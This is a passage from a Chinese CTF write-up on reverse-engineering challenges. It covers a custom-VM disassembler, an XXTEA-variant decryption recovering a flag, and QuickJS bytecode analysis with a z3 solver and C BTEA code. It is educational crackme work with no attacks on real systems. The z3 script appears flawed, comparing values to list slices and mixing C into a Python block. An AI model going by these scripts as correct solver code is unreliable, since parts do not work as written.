class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">4</span>,<span class="number">0</span>,<span class="number">1</span>):</span><br><span class="line">            r[<span class="number">16</span>] = v5+<span class="number">3</span></span><br><span class="line">            v6 = opcode[v5+<span class="number">2</span>] | v6&lt;&lt;<span class="number">8</span></span><br><span class="line">            v5 += <span class="number">1</span></span><br><span class="line">        <span class="comment"># v6 = opcode[v5+2]&lt;&lt;24 | opcode[v5+3]&lt;&lt;16 | opcode[v5+4]&lt;&lt;8 | opcode[v5+5]</span></span><br><span class="line">        r[<span class="number">16</span>] = v5 - <span class="number">4</span>*r[v3]+<span class="number">14</span></span><br><span class="line">        r[v2] = v6</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v2&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(v6)&#125;</span>   opcode[v1+4*r[opcode[v1+1]]+2]&lt;&lt;24 | opcode[v1+4*r[opcode[v1+1]]+3]&lt;&lt;16 | opcode[v1+4*r[opcode[v1+1]]+4]&lt;&lt;8 | opcode[v1+4*r[opcode[v1+1]]+5]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">3</span>:</span><br><span class="line">        v2 = r[<span class="number">16</span>]</span><br><span class="line">        v3 = opcode[v2]</span><br><span class="line">        v4 = opcode[v2+<span class="number">1</span>]</span><br><span class="line">        v5 = r[v4]</span><br><span class="line">        r[<span class="number">16</span>] = v2+<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> opcode[v2+<span class="number">2</span>]==<span class="number">0xe2</span>:</span><br><span class="line">            mem[v5] = r[v3]</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v2)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;mem[<span class="subst">&#123;v5&#125;</span>] = r[<span class="subst">&#123;v3&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r[v3] = mem[v5]</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v2)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = mem[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">13</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(r[<span class="number">16</span>])+<span class="string">&#x27;:\treturn&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">14</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v3 = v1+<span class="number">2</span></span><br><span class="line">        v4 = opcode[v1]</span><br><span class="line">        v5 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> v4 == <span class="number">0xe0</span>:</span><br><span class="line">            v6 = v1+<span class="number">3</span></span><br><span class="line">            r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">            v7 = r[opcode[v1+<span class="number">2</span>]]</span><br><span class="line">            s = <span class="string">f&#x27;r[<span class="subst">&#123;opcode[v1+<span class="number">2</span>]&#125;</span>]&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v7 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span>(v4&lt;&lt;<span class="number">24</span>):</span><br><span class="line">                r[<span class="number">16</span>] = v3+<span class="number">1</span></span><br><span class="line">                v4 -= <span class="number">1</span></span><br><span class="line">                v7 = opcode[v3] | (v7&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v3 += <span class="number">1</span></span><br><span class="line">            s = <span class="built_in">hex</span>(v7)</span><br><span class="line">            v6 = v3</span><br><span class="line">        r[<span class="number">16</span>] = v6+<span class="number">1</span></span><br><span class="line">        res = opcode[v6]-<span class="number">0xff</span>-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> res == -<span class="number">11</span>:</span><br><span class="line">            r[v5] = (r[v5] +v7)&amp;<span class="number">0xffffffff</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] += &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">10</span>:</span><br><span class="line">            r[v5] = (r[v5] - v7) &amp;<span class="number">0xffffffff</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] -= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">9</span>:</span><br><span class="line">            r[v5] *= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] *= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">8</span>:</span><br><span class="line">            r[v5] //= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] //= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">7</span>:</span><br><span class="line">            r[v5] &lt;&lt;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &lt;&lt;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">6</span>:</span><br><span class="line">            r[v5] &gt;&gt;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &gt;&gt;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">5</span>:</span><br><span class="line">            r[v5] ^= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] ^= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">4</span>:</span><br><span class="line">            r[v5] |= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] |= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">3</span>:</span><br><span class="line">            r[v5] &amp;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &amp;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">&#x27;wrong2&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(r[<span class="number">16</span>])+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">&#x27;wrong&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>（其中mem即为输入，手动代了几个数字方便调试）</p>
<p>按照流程，打印出7000+行代码，大致观察发现有明显的xxtea的特征，delta=0xf4f3f2f1，循环64轮，key=[0xf1f2f3f4,0xf5f6f7f8,0xf9fafbfc,0xfdfefff0]</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/25.png" alt="25"></p>
<p>解密无果，猜测有魔改，结果在开头和结尾又发现了一些加密。</p>
<p>开头将输入调换位置</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/26.png" alt="img"></p>
<p>结尾异或0xf8f7f6f5并调换位置</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/27.png" alt="img"></p>
<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x55D37604</span>, <span class="number">0xB5FFA19E</span>, <span class="number">0xC202F734</span>, <span class="number">0x963BE91F</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    a[i] ^= <span class="number">0xf8f7f6f5</span></span><br><span class="line">t = a[<span class="number">3</span>]</span><br><span class="line">a[<span class="number">3</span>] = a[<span class="number">0</span>]</span><br><span class="line">a[<span class="number">0</span>] = t</span><br><span class="line">t = a[<span class="number">1</span>]</span><br><span class="line">a[<span class="number">1</span>] = a[<span class="number">2</span>]</span><br><span class="line">a[<span class="number">2</span>] = t</span><br><span class="line">a2 = [<span class="number">0xf1f2f3f4</span>,<span class="number">0xf5f6f7f8</span>,<span class="number">0xf9fafbfc</span>,<span class="number">0xfdfefff0</span>]</span><br><span class="line">v5 = <span class="number">0xf4f3f2f1</span></span><br><span class="line"><span class="comment"># n = 52//len(a) + 6</span></span><br><span class="line">v8 = v5*<span class="number">64</span></span><br><span class="line">v9 = a[<span class="built_in">len</span>(a)-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    j = <span class="built_in">len</span>(a)-<span class="number">2</span></span><br><span class="line">    v9 = a[j]</span><br><span class="line">    v6 = (v8&gt;&gt;<span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">    a[<span class="built_in">len</span>(a)-<span class="number">1</span>] = (a[<span class="built_in">len</span>(a)-<span class="number">1</span>] - (((v9 ^ a2[v6 ^ ((j+<span class="number">1</span>) &amp; <span class="number">3</span>)]) + (a[<span class="number">0</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[<span class="number">0</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">while</span>(j&gt;<span class="number">0</span>):</span><br><span class="line">        v9 = a[j-<span class="number">1</span>]</span><br><span class="line">        a[j] = (a[j] - (((v9 ^ a2[v6 ^ (j &amp; <span class="number">3</span>)]) + (a[j+<span class="number">1</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[j+<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[j+<span class="number">1</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        j -= <span class="number">1</span></span><br><span class="line">    v9 = a[<span class="built_in">len</span>(a)-<span class="number">1</span>]</span><br><span class="line">    a[<span class="number">0</span>] = (a[<span class="number">0</span>] - (((v9 ^ a2[v6 ^ (j &amp; <span class="number">3</span>)]) + (a[j+<span class="number">1</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[j+<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[j+<span class="number">1</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    v8 -= v5</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]:                               <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 1t_i5_3z_i5nt_it</span></span><br></pre></td></tr></table></figure>
<h3 id="easyjs"><strong>easyjs</strong></h3>
<p>quickjs,下载源码编译输出字节码，具体参考https://bbs.pediy.com/thread-259014.htm</p>
<p>字节码中首先观察到了初始化一些常量函数以及字符串</p>
<p>可以很明显的看到一个大小写互换的base64表</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/28.png" alt="img"></p>
<p>得到字节码开始分析eval函数，这个相当于正常的main函数</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/29.png" alt="img"></p>
<p>这里的意思应该是encode64（enc1（））的意思，所以先调用enc1，然后再调用encode64</p>
<p>enc1里面就是一个BTEA delta mx key都很容易知道，上网上扒一个代码实现就行了</p>
<p>后面是一个错位异或，</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/30.png" alt="img"></p>
<p>最后调用了func5 func6函数 func5函数是一个转大整数的方法，</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/31.png" alt="img"></p>
<p>func6里面主要是一堆的逻辑运算，然后与已知量比较，</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/32.png" alt="32"></p>
<p>将data3 15个数字分为三组，然后进行比较，拿z3解一下</p>
<p>总结一下就是先逆出来逻辑运算、然后是异或、base64、BTEA写脚本解就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data3 = [<span class="number">5911837666743816200</span>,</span><br><span class="line"><span class="number">5133585975960501272</span>,</span><br><span class="line"><span class="number">9082418069800623372</span>,</span><br><span class="line"><span class="number">9154480062992383756</span>,</span><br><span class="line"><span class="number">6848599583376686600</span>,</span><br><span class="line"><span class="number">147787617043219975</span>,</span><br><span class="line"><span class="number">6140429622497212985</span>,</span><br><span class="line"><span class="number">2526269866358605591</span>,</span><br><span class="line"><span class="number">4552892036882908959</span>,</span><br><span class="line"><span class="number">4543304157965338119</span>,</span><br><span class="line"><span class="number">4620825451554930944</span>,</span><br><span class="line"><span class="number">8808899373961281307</span>,</span><br><span class="line"><span class="number">5924901230665995531</span>,</span><br><span class="line"><span class="number">8808899373961281307</span>,</span><br><span class="line"><span class="number">8662527953563041043</span>]</span><br><span class="line"></span><br><span class="line">data4 = [<span class="number">2101524238053948931</span>,</span><br><span class="line"><span class="number">9154814254531429383</span>,</span><br><span class="line"><span class="number">8941618984500083987</span>]</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    data5 = [BitVec(<span class="string">&quot;x%d&quot;</span> % i, <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    x = data5[<span class="number">0</span>]</span><br><span class="line">    y = data5[<span class="number">1</span>]</span><br><span class="line">    z = data5[<span class="number">2</span>]</span><br><span class="line">    w = data5[<span class="number">3</span>]</span><br><span class="line">    a = ~x &amp; z</span><br><span class="line">    b = (z &amp; ~x | (x&amp;y) | (z &amp; (~y)) | (x &amp; (~y)) ) ^ w</span><br><span class="line">    c = (z &amp; ~y &amp; x)| (z &amp; ((x &amp; y) | (y &amp; (~x)) | ~(y | x)))</span><br><span class="line">    d = (z &amp; ~x) | (x &amp; y) | (z &amp; ~y) | (x &amp; ~y)</span><br><span class="line">    e = (z &amp; ~x) | (x&amp;y) | (y&amp;z)</span><br><span class="line">    s = Solver()</span><br><span class="line">    s.add(a == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(b == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(c == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(d == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(e == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(y == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.check()</span><br><span class="line">    m = s.model()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data5:</span><br><span class="line">        res.append(<span class="built_in">int</span>(<span class="built_in">str</span>(m[i])))</span><br><span class="line">    <span class="comment">#print(res)</span></span><br><span class="line">    </span><br><span class="line">    aa = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            k.append(r &amp; <span class="number">0xff</span>)</span><br><span class="line">            r &gt;&gt;= <span class="number">8</span></span><br><span class="line">        aa += k</span><br><span class="line">    data += aa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">data[-<span class="number">1</span>] = data[-<span class="number">1</span>]^data[<span class="number">1</span>]</span><br><span class="line">data[-<span class="number">2</span>] = data[-<span class="number">2</span>]^data[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">3</span>, -<span class="number">1</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    data[i] ^= data[i+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"> </span><br><span class="line">using namespace std;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#define DELTA 289739796</span></span><br><span class="line"><span class="comment">#define MX (((z &gt;&gt; 6) ^ (y &lt;&lt; 3)) + ((y &gt;&gt; 4) ^ (z &lt;&lt; 5)) ^ ((sum^y) + (secret[(p&amp;3)^e] ^ z)))  </span></span><br><span class="line"> </span><br><span class="line">  void btea(uint32_t *vector, <span class="built_in">int</span> n, uint32_t const secret[<span class="number">4</span>]) &#123;</span><br><span class="line">    uint32_t y, z, <span class="built_in">sum</span>;</span><br><span class="line">    unsigned p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          </span><br><span class="line">      rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">      z = vector[n-<span class="number">1</span>];</span><br><span class="line">      do &#123;</span><br><span class="line">        <span class="built_in">sum</span> += DELTA;</span><br><span class="line">        e = (<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n-<span class="number">1</span>; p++) &#123;</span><br><span class="line">          y = vector[p+<span class="number">1</span>];</span><br><span class="line">          z = vector[p] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        y = vector[<span class="number">0</span>];</span><br><span class="line">        z = vector[n-<span class="number">1</span>] += MX;</span><br><span class="line">      &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; -<span class="number">1</span>) &#123;  </span><br><span class="line">      n = -n;</span><br><span class="line">      rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="built_in">sum</span> = rounds*DELTA;</span><br><span class="line">      y = vector[<span class="number">0</span>];</span><br><span class="line">      do &#123;</span><br><span class="line">        e = (<span class="built_in">sum</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=n-<span class="number">1</span>; p&gt;<span class="number">0</span>; p--) &#123;</span><br><span class="line">          z = vector[p-<span class="number">1</span>];</span><br><span class="line">          y = vector[p] -= MX;</span><br><span class="line">        &#125;</span><br><span class="line">        z = vector[n-<span class="number">1</span>];</span><br><span class="line">        y = vector[<span class="number">0</span>] -= MX;</span><br><span class="line">      &#125; <span class="keyword">while</span> ((<span class="built_in">sum</span> -= DELTA) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    char secret[<span class="number">17</span>] = <span class="string">&quot;welcometoycb2022&quot;</span>;</span><br><span class="line">    uint8_t buf[] = &#123;<span class="number">50</span>, <span class="number">145</span>, <span class="number">242</span>, <span class="number">166</span>, <span class="number">198</span>, <span class="number">128</span>, <span class="number">32</span>, <span class="number">9</span>, <span class="number">222</span>, <span class="number">204</span>, <span class="number">87</span>, <span class="number">158</span>, <span class="number">160</span>, <span class="number">147</span>, <span class="number">155</span>, <span class="number">82</span>, <span class="number">71</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">246</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">185</span>, <span class="number">225</span>, <span class="number">62</span>, <span class="number">226</span>, <span class="number">31</span>, <span class="number">171</span>, <span class="number">199</span>, <span class="number">245</span>, <span class="number">106</span>, <span class="number">31</span>&#125;;</span><br><span class="line">    btea((uint32_t*)buf,-<span class="number">8</span>,(uint32_t*)secret);</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> j=<span class="number">0</span>;j&lt;<span class="number">32</span>;j++)</span><br><span class="line">        printf(<span class="string">&quot;%c&quot;</span>,buf[j]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Crypto/" rel="tag"># Crypto</a>
              <a href="/tags/Web/" rel="tag"># Web</a>
              <a href="/tags/Misc/" rel="tag"># Misc</a>
              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
              <a href="/tags/Reverse/" rel="tag"># Reverse</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/09/kail%E5%8D%87%E7%BA%A7%E6%8A%A5%E9%94%99%EF%BC%9AE%20%E4%BB%93%E5%BA%93%20%E2%80%9Chttpsdownload.docker.comlinuxdebian%20kali-rolling%20Release%E2%80%9D%20%E6%B2%A1%E6%9C%89%20Release%20%E6%96%87%E4%BB%B6%E3%80%82/" rel="prev" title="kali升级报错没有 Release 文件">
                  <i class="fa fa-chevron-left"></i> kali升级报错没有 Release 文件
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/" rel="next" title="SQL- ffifdyop绕过">
                  SQL- ffifdyop绕过 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">TWe1v3</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">224k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">3:24</span>
  </span>
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>

    </div>
  </footer>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.3/mermaid.min.js","integrity":"sha256-TIYL00Rhw/8WaoUhYTLX9SKIEFdXxg+yMWSLVUbhiLg="}}</script>
  <script src="/js/third-party/tags/mermaid.js"></script>



  




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/katex.min.css" integrity="sha256-uik/hNqHWZldXh/0K35nqOSCff9F61/ZOFReqNOBgB0=" crossorigin="anonymous">
  <script class="next-config" data-name="katex" type="application/json">{"copy_tex_js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/contrib/copy-tex.min.js","integrity":"sha256-Us54+rSGDSTvIhKKUs4kygE2ipA0RXpWWh0/zLqw3bs="}}</script>
